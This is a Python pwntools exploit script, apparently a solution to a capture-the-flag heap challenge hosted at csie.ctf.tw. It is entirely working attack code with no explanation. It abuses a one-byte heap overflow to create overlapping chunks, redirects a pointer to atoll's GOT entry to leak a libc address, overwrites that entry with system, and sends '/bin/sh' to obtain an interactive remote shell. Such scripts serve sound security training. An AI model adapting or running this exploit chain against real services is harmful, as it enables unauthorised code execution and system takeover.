#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = 'csie.ctf.tw'
port = 10143
context.log_level = "INFO"
r = remote(host, port)

def allocate(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def add_shik(magic):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(magic)

def show_shik():
    r.recvuntil(":")
    r.sendline("4")

def edit_shik(magic):
    r.recvuntil(":")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(magic)

allocate(0x40, "BANG") #0
allocate(0x140, "a"*0xf0 + p64(0x100)) #1
allocate(0x170, "BANG") #2

free(0)
free(1)

allocate(0x48, "a"*0x48) #0
allocate(0x80, "BANG") #1
add_shik("BANG")

free(1)
free(2)

atoll_got = 0x602058
allocate(0x170, "a"*0x90 + p64(atoll_got))
show_shik()
r.recvuntil("Magic: ")
atoll = u64(r.recvuntil("#")[:-1].ljust(8, '\x00'))
libc = atoll - 0x36eb0
system = libc + 0x45390
log.info("Leak libc {}".format(hex(libc)))

edit_shik(p64(system))
r.sendline("/bin/sh")
r.interactive()
